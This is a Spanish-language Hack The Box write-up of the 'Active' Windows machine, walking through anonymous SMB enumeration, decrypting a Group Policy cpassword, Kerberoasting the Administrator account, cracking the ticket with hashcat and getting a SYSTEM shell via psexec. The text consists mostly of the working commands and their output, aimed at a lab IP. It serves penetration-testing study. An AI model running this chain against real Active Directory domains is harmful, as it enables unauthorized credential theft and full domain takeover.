# Hack The Box - Active 

*Active* es una máquina *Windows* de la plataforma *Hack The Box* con un *rating* de 5 estrellas creada por *eks* & *mrb3n*.

![](https://raw.githubusercontent.com/sec-balkan/Vulnerable_Machines_writeups/main/hackthebox/img/active.jpg)

![](https://raw.githubusercontent.com/sec-balkan/Vulnerable_Machines_writeups/main/hackthebox/img/E5ioAGNWEAQVcYw.jpg)

* * *

### TL;DR

En el archivo `Groups.xml` alojado en una ruta del servidor en un recurso compartido encontraremos unas credenciales encriptadas, las cuales podrán verse en texto plano gracias a la utilidad `gpp-decrypt`. Realizaremos Kerberoasting para obtener un TGS, el cual crackearemos y obtendremos las credenciales de administrador.

- Escaneo
	- `nmap`
- Enumeración
	- `smbmap`
	- `smbclient`
	- `Groups.xml` - `gpp-decrypt`
- Explotación
	- Kerberoasting
	- `psexec`

Lo primero que haremos será añadir de la máquina y asignarle un "nombre" para que sea más fácil trabajar con ella, en este caso la he llamado active.htb.

```console
┌──(root💀kali)-[/home/kali]
└─# echo "10.10.10.100 active.htb" >> /etc/hosts

┌──(root💀kali)-[/home/kali]
└─# cat /etc/hosts | grep active                                                                          
10.10.10.100 active.htb
```

Lo siguiente que haremos será un escaneo en el *target* con `nmap`.

```console
┌──(root💀kali)-[/home/kali]
└─# nmap -sT -p- --open -T5 --min-rate 10000 -n active.htb
Starting Nmap 7.91 ( https://nmap.org ) at x x EDT
Warning: 10.10.10.100 giving up on port because retransmission cap hit (2).
Nmap scan report for active.htb (10.10.10.100)
Host is up (0.063s latency).
Not shown: 36668 closed ports, 28851 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
49152/tcp open  unknown
49154/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49171/tcp open  unknown
49182/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 15.65 seconds
```

Tenemos el servicio samba expuesto (445), así que con la herramienta `smbclient` y `smbmap` procederemos a enumerar el servicio (obviamente desde una sesión nula o anónima, puesto que no tenemos todavía credenciales).

```console
┌──(root💀kali)-[/home/kali]
└─# smbmap -H active.htb                                                                                                      
[+] IP: active.htb:445  Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
```

Observamos que tenemos un recurso compartido al cual solo tenemos acceso de lectura llamado `Replication`.

Nos conectaremos con un cliente de samba a ese recurso usando una sesión nula para poderlo enumerar más a fondo.

```console
┌──(root💀kali)-[/home/kali]
└─# smbclient -N \\\\active.htb\\Replication 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

                10459647 blocks of size 4096. 5727505 blocks available
smb: \>
```

En nuestro proceso de enumeración nos damos cuenta de que este recurso replica a `SYSVOL`. Continuando la enumeración nos topamos con un directorio llamado `Policies`, el cual contiene las *Domain Group Policies*, al igual que si estuviéramos en el recurso `SYSVOL`.

```console
smb: \active.htb\> cd Policies
smb: \active.htb\Policies\> recurse
smb: \active.htb\Policies\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Jul 21 06:37:44 2018
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Jul 21 06:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GPT.INI                             A       23  Wed Jul 18 16:46:06 2018
  Group Policy                        D        0  Sat Jul 21 06:37:44 2018
  MACHINE                             D        0  Sat Jul 21 06:37:44 2018
  USER                                D        0  Wed Jul 18 14:49:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GPT.INI                             A       22  Wed Jul 18 14:49:12 2018
  MACHINE                             D        0  Sat Jul 21 06:37:44 2018
  USER                                D        0  Wed Jul 18 14:49:12 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GPE.INI                             A      119  Wed Jul 18 16:46:06 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Microsoft                           D        0  Sat Jul 21 06:37:44 2018
  Preferences                         D        0  Sat Jul 21 06:37:44 2018
  Registry.pol                        A     2788  Wed Jul 18 14:53:45 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER
  .                                   D        0  Wed Jul 18 14:49:12 2018
  ..                                  D        0  Wed Jul 18 14:49:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Microsoft                           D        0  Sat Jul 21 06:37:44 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\USER
  .                                   D        0  Wed Jul 18 14:49:12 2018
  ..                                  D        0  Wed Jul 18 14:49:12 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Windows NT                          D        0  Sat Jul 21 06:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups                              D        0  Sat Jul 21 06:37:44 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Windows NT                          D        0  Sat Jul 21 06:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  SecEdit                             D        0  Sat Jul 21 06:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  SecEdit                             D        0  Sat Jul 21 06:37:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GptTmpl.inf                         A     1098  Wed Jul 18 14:49:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  GptTmpl.inf                         A     3722  Wed Jul 18 14:49:12 2018

                10459647 blocks of size 4096. 5727505 blocks available
```

En el directorio `\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups` nos topamos con un archivo llamado `Groups.xml`, el cual contiene las credenciales de un usuario del dominio, podemos leer el archivo con `more` para que se nos abra una ventana del editor `vim`.

```console
smb: \active.htb\Policies\> more {31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as /tmp/smbmore.BZWfdL (2.3 KiloBytes/sec) (average 1.9 KiloBytes/sec)
```

```console
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9[...]" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
/tmp/smbmore.2qRr3M (END)
```

En los archivos `Group.xml`, se encuentran almacenadas las credenciales (Políticas de grupo para la administración de cuentas) de usuarios.

Como breve resumen, contiene una contraseña cifrada en `AES-256`. Sin embargo, Microsoft en 2012, publicó la clave AES, lo que significó, que se podían desencriptar.

Podemos desencriptar la contraseña usando (en Linux) la utilidad `gpp-decrypt`, y así obtenemos las credenciales para el usuario SVC_TGS.

```console
┌──(root💀kali)-[/home/kali]
└─# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA9[...]
GPP[...]
```

Con `crackmapexec` podemos comprobar que esas credenciales son válidas para nuestro *target*, pero no podemos ejecutar un movimiento lateral hacia la máquina o ejecutar código en ella puesto que no somos administradores (sino nos saldría un *pwned* en `crackmapexec`).

```console
┌──(root💀kali)-[/home/kali]
└─# crackmapexec smb active.htb -u 'SVC_TGS' -p 'GPP[...]'                                                       
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPP[...]
```

Teniendo el servicio Kerberos expuesto (88), y unas credenciales válidas del dominio, podemos intuir que el siguiente paso podría ser la técnica *Kerberoasting*.

Al igual que antes no voy a explicar el qué y cómo funciona Kerberos, pero dejaré por aquí recursos interesantes.

Com la *tool* de `impacket` `GetUserSPNs` podemos solicitar un TGS al DC son nuestras credenciales, y nos lo devolverá en un formato crackeable para `john` o `hashcat`

```console
┌──(root💀kali)-[/home/kali]
└─# impacket-GetUserSPNs -request active.htb/SVC_TGS -outputfile hash.txt                                                                                      130 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-07-22 11:21:54.046318             
                                                                                                                                                                     
┌──(root💀kali)-[/home/kali]
└─# cat hash.txt                                                                          
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$ec17108f0d44dd2ae92650f33e6ec1ef$e05e1d69bc38a13e45b607251effe7c10c3f5eb0556aed7e41649dc6bab22e38ad7aa46676f4caf2a19fbcb486ccec978cf0c3527b79d79b51482f47adf1bb2d1ef898634227f04316023dcc942cae7ec8a82d252ce098486231d1974c647e693d514ebba848483b66f232240361267a5e6f5978a92af55c98811f20569729fd92efca92f540587e24982c2a2de82bec41e8bd2bb7e2b8e2ae5d2ddb8a3c1c4e6a8d8b974ed4d8ccec139c9a6154e839605c5805d43241d505b3f8598b37de7361b843528888bfa0cd5840da10b2a5f40506f8e3cc8bc05f7ff310b9a48902e1ef99cd33e120fb16dc9c6c343a2a1a963a1ad73de6a4e7a4bb71d8fd66282e67d51e4a5a76ad1b3bbd03c7067bf6b154a1e4accfc0c3cf7350d32f58415587d30e832e2a270480ece0a641bee56d0728d3ae54d6b07ce291b1eec9bc6d3607c131868bd9151bc96fe5505d7d[...]
```

Con `hashcat` en el modo 13100, podemos crackear los TGS de Kerberos.

```console
┌──(root💀kali)-[/home/kali]
└─# hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: x

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 134 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$ec17108f0d44dd2ae92650f33e6ec1ef$e05e1d69bc38a13e45b607251effe7c10c3f5eb0556aed7e41649dc6bab22e38ad7aa46676f4caf2a19fbcb486ccec978cf0c3527b79d79b51482f47adf1bb2d1ef898634227f04316023dcc942cae7ec8a82d252ce098486231d1974c647e693d514ebba848483b66f232240361267a5e6f5978a92af55c98811f20569729fd92efca92f540587e24982c2a2de82bec41e8bd2bb7e2b8e2ae5d2ddb8a3c1c4e6a8d8b974ed4d8ccec139c9a6154e839605c5805d43241d505b3f8598b37de7361b843528888bfa0cd5840da10b2a5f40506f8e3cc8bc05f7ff310b9a48902e1ef99cd33e120fb16dc9c6c343a2a1a963a1ad73de6a4e7a4bb71d8fd66282e67d51e4a5a76ad1b3bbd03c7067bf6b154a1e4accfc0c3cf7350d32f58415587d30e832e2a270480ece0a641bee56d0728d3ae54d6b07ce291b1eec9bc6d3607c131868bd9151bc96fe5505d7d[...]:Ticket[...]
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...954758
Time.Started.....: Thu Jul 22 11:25:11 2021 (11 secs)
Time.Estimated...: Thu Jul 22 11:25:22 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   933.4 kH/s (9.93ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10551296/14344385 (73.56%)
Rejected.........: 0/10551296 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Tioncurtis23 -> TUGGIE

Started: x
Stopped: x
```

Una vez tenemos las credenciales podemos comprobarlas con `crackmapexec`, y al poner `Pwn3d!` ya podemos movernos lateralmente (`psexsec`) o ejecutar código en el DC como el usuario actual.

```console
┌──(root💀kali)-[/home/kali]
└─# crackmapexec smb active.htb -u 'Administrator' -p 'Ticket[...]'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticket[...] (Pwn3d!)

┌──(root💀kali)-[/home/kali]
└─# crackmapexec smb active.htb -u 'Administrator' -p 'Ticket[...]' -x whoami    
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticket[...] (Pwn3d!)
SMB         10.10.10.100    445    DC               [+] Executed command 
SMB         10.10.10.100    445    DC               active\administrator
```

Finalmente, con `psexsec` generamos una shell inversa.

```console
┌──(root💀kali)-[/home/kali]
└─# impacket-psexec active.htb/Administrator:Ticket[...]@10.10.10.100                                                                                     130 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file KtWiNOMK.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service sWtv on 10.10.10.100.....
[*] Starting service sWtv.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
DC

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
<no_te_la_voy_a_decir>

C:\Windows\system32>
```

